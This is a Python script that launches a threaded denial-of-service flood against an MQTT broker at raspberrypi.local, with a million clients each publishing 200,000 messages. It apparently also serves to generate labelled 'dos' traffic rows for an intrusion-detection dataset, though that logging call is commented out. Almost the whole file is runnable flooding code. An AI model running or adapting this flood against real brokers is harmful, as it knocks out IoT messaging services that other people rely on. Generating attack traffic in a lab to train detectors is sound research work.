import threading
import time
import random
import csv
import os
import paho.mqtt.client as mqtt

# ⚙️ Configuration
BROKER = "raspberrypi.local"
PORT = 1883
TOPIC = "dos/flood"
DOS_CLIENTS = 1000000
MESSAGES_PER_CLIENT = 200000
CSV_LOG_FILE = "ddos_attacks_log.csv"

CSV_COLUMNS = [
    'tcp.flags', 'tcp.time_delta', 'tcp.len', 'mqtt.conack.flags', 'mqtt.conack.flags.reserved',
    'mqtt.conack.flags.sp', 'mqtt.conack.val', 'mqtt.conflag.cleansess', 'mqtt.conflag.passwd',
    'mqtt.conflag.qos', 'mqtt.conflag.reserved', 'mqtt.conflag.retain', 'mqtt.conflag.uname',
    'mqtt.conflag.willflag', 'mqtt.conflags', 'mqtt.dupflag', 'mqtt.hdrflags', 'mqtt.kalive',
    'mqtt.len', 'mqtt.topic', 'mqtt.msg', 'mqtt.msgid', 'mqtt.msgtype', 'mqtt.proto_len',
    'mqtt.protoname', 'mqtt.qos', 'mqtt.retain', 'mqtt.sub.qos', 'mqtt.suback.qos', 'mqtt.ver',
    'mqtt.willmsg', 'mqtt.willmsg_len', 'mqtt.willtopic', 'mqtt.willtopic_len', 'target'
]

# 🔧 Ensure CSV exists
if not os.path.isfile(CSV_LOG_FILE) or os.stat(CSV_LOG_FILE).st_size == 0:
    with open(CSV_LOG_FILE, mode='w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=CSV_COLUMNS)
        writer.writeheader()

# 🧾 Logging function
def log_ddos_packet(payload, msgid):
    row = {
        'tcp.flags': "0x00",
        'tcp.time_delta': round(random.uniform(0.00001, 0.005), 8),
        'tcp.len': len(payload),
        'mqtt.conack.flags': 0,
        'mqtt.conack.flags.reserved': 0,
        'mqtt.conack.flags.sp': 0,
        'mqtt.conack.val': 0,
        'mqtt.conflag.cleansess': 0,
        'mqtt.conflag.passwd': 0,
        'mqtt.conflag.qos': 0,
        'mqtt.conflag.reserved': 0,
        'mqtt.conflag.retain': 0,
        'mqtt.conflag.uname': 0,
        'mqtt.conflag.willflag': 0,
        'mqtt.conflags': 0,
        'mqtt.dupflag': 0,
        'mqtt.hdrflags': 0,
        'mqtt.kalive': 60,
        'mqtt.len': len(payload),
        'mqtt.topic': TOPIC,
        'mqtt.msg': payload,
        'mqtt.msgid': msgid,
        'mqtt.msgtype': 3,
        'mqtt.proto_len': 4,
        'mqtt.protoname': "MQTT",
        'mqtt.qos': 0,
        'mqtt.retain': 0,
        'mqtt.sub.qos': 0,
        'mqtt.suback.qos': 0,
        'mqtt.ver': 4,
        'mqtt.willmsg': '',
        'mqtt.willmsg_len': 0,
        'mqtt.willtopic': '',
        'mqtt.willtopic_len': 0,
        'target': 'dos'
    }

    with open(CSV_LOG_FILE, mode='a', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=CSV_COLUMNS)
        writer.writerow(row)

# 🧨 DoS attack using multiple threads
def dos_attack():
    print("[*] Starting DoS attack using MQTT clients...")

    def flood_client(i):
        try:
            client = mqtt.Client(client_id=f"dos_{i}", clean_session=True)
            client.connect(BROKER, PORT, keepalive=60)
            client.loop_start()
            for j in range(MESSAGES_PER_CLIENT):
                payload = f"dos-{i}-{j}"
                result = client.publish(TOPIC, payload=payload, qos=0)
                #log_ddos_packet(payload, msgid=random.randint(1, 65535))
                #time.sleep(0.1)
            client.loop_stop()
            client.disconnect()
        except Exception as e:
            print(f"[DoS-{i}] Error: {e}")

    threads = []
    for i in range(DOS_CLIENTS):
        t = threading.Thread(target=flood_client, args=(i,))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[+] DoS attack completed.\n")

# 🏁 Run the attack
if __name__ == "__main__":
    dos_attack()
